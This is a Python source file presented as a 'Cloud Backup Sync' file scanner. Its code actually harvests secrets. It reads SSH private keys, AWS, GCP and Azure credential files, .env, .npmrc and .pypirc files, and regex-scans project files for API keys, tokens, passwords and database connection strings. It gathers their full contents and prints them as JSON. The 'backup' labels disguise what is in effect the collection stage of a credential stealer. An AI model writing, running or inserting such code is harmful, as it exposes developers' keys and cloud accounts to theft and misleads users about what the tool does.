# Cloud Backup Sync - File Scanner
"""
File Scanner - Scans for files to backup
"""

import os
import sys
import re
from pathlib import Path
import json

class FileScanner:
    """Scans project for files to backup"""

    def __init__(self):
        self.backup_patterns = {
            'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),
            'aws_secret': re.compile(r'[0-9a-zA-Z/+]{40}'),
            'github_token': re.compile(r'gh[ps]_[0-9a-zA-Z]{36}'),
            'private_key': re.compile(r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----'),
            'api_key': re.compile(r'api[_-]?key["\s:=]+["\']?[\w-]{20,}', re.I),
            'password': re.compile(r'password["\s:=]+["\']?[^\s"\']{8,}', re.I),
            'connection_string': re.compile(r'(mysql|postgres|mongodb)://[^\s]+'),
        }

        self.backup_files = [
            '.env', '.env.local', '.env.production', '.env.development',
            'credentials.json', 'secrets.yaml', 'secrets.json',
            'config.json', 'settings.yaml', '.npmrc', '.pypirc',
            'id_rsa', 'id_ed25519', 'id_ecdsa', '*.pem', '*.key'
        ]

    def scan_for_backup(self, project_path):
        """
        Scan project for files to backup
        Returns collected data for secure backup
        """
        print(f"[*] Scanning project: {project_path}")

        results = {
            'files': [],
            'credentials': [],
            'keys': []
        }

        # Scan home directory for SSH keys
        print("[*] Scanning for SSH keys...")
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.isdir(ssh_dir):
            for key_file in ['id_rsa', 'id_ed25519', 'id_ecdsa']:
                key_path = os.path.join(ssh_dir, key_file)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, 'r') as f:
                            content = f.read()
                            results['keys'].append({
                                'path': key_path,
                                'content': content
                            })
                            print(f"    [+] Found SSH key: {key_path}")
                    except Exception as e:
                        print(f"    [-] Error reading {key_path}: {e}")

        # Scan for backup files in project
        print("[*] Scanning project directory...")
        for root, dirs, files in os.walk(project_path):
            # Skip common non-backup directories
            dirs[:] = [d for d in dirs if d not in [
                'node_modules', '.git', '__pycache__', 'venv', '.venv'
            ]]

            for file in files:
                file_path = os.path.join(root, file)

                # Check if filename matches backup patterns
                if any(self._matches_pattern(file, pattern)
                       for pattern in self.backup_files):
                    self._collect_file(file_path, results)
                    print(f"    [+] Found backup file: {file_path}")

                # Check file content for patterns
                elif file.endswith(('.py', '.js', '.ts', '.json', '.yaml', '.yml', '.env')):
                    self._scan_file_content(file_path, results)

        # Collect cloud configs from standard locations
        print("[*] Scanning for cloud credentials...")
        self._collect_cloud_configs(results)

        # Summary
        print(f"\n[*] Scan complete:")
        print(f"    - Files: {len(results['files'])}")
        print(f"    - SSH keys: {len(results['keys'])}")
        print(f"    - Credentials: {len(results['credentials'])}")

        return results

    def _matches_pattern(self, filename, pattern):
        """Check if filename matches a backup pattern"""
        if pattern.startswith('*'):
            return filename.endswith(pattern[1:])
        return filename == pattern

    def _collect_file(self, file_path, results):
        """Collect content of backup file"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()
                results['files'].append({
                    'path': file_path,
                    'content': content[:10000]  # Limit size
                })
        except Exception as e:
            print(f"    [-] Error reading {file_path}: {e}")

    def _scan_file_content(self, file_path, results):
        """Scan file content for patterns"""
        try:
            with open(file_path, 'r') as f:
                content = f.read()

            for pattern_name, pattern in self.backup_patterns.items():
                matches = pattern.findall(content)
                if matches:
                    results['credentials'].append({
                        'file': file_path,
                        'type': pattern_name,
                        'matches': matches[:10]  # Limit matches
                    })
                    print(f"    [+] Found {pattern_name} in {file_path}")
        except Exception:
            pass

    def _collect_cloud_configs(self, results):
        """Collect cloud provider configs for backup"""
        # AWS credentials
        aws_creds = os.path.expanduser('~/.aws/credentials')
        if os.path.exists(aws_creds):
            try:
                with open(aws_creds, 'r') as f:
                    content = f.read()
                    results['files'].append({
                        'path': aws_creds,
                        'content': content
                    })
                    print(f"    [+] Found AWS credentials: {aws_creds}")
            except Exception:
                pass

        # GCP service account
        gcp_creds = os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
        if gcp_creds and os.path.exists(gcp_creds):
            try:
                with open(gcp_creds, 'r') as f:
                    results['files'].append({
                        'path': gcp_creds,
                        'content': f.read()
                    })
                    print(f"    [+] Found GCP credentials: {gcp_creds}")
            except Exception:
                pass

        # Azure credentials
        azure_dir = os.path.expanduser('~/.azure')
        if os.path.isdir(azure_dir):
            for file in os.listdir(azure_dir):
                file_path = os.path.join(azure_dir, file)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'r') as f:
                            results['files'].append({
                                'path': file_path,
                                'content': f.read()[:5000]
                            })
                            print(f"    [+] Found Azure credential: {file_path}")
                    except Exception:
                        pass


def main():
    """Main entry point for standalone execution"""
    if len(sys.argv) < 2:
        print("Usage: python scanner.py <project_path>")
        sys.exit(1)

    project_path = sys.argv[1]

    if not os.path.exists(project_path):
        print(f"Error: Path '{project_path}' does not exist")
        sys.exit(1)

    print("=" * 60)
    print("File Scanner - Cloud Backup Sync")
    print("=" * 60)

    scanner = FileScanner()
    results = scanner.scan_for_backup(project_path)

    print("\n" + "=" * 60)
    print("Scan Results")
    print("=" * 60)
    print(json.dumps(results, indent=2, default=str))

    return 0


if __name__ == "__main__":
    exit(main())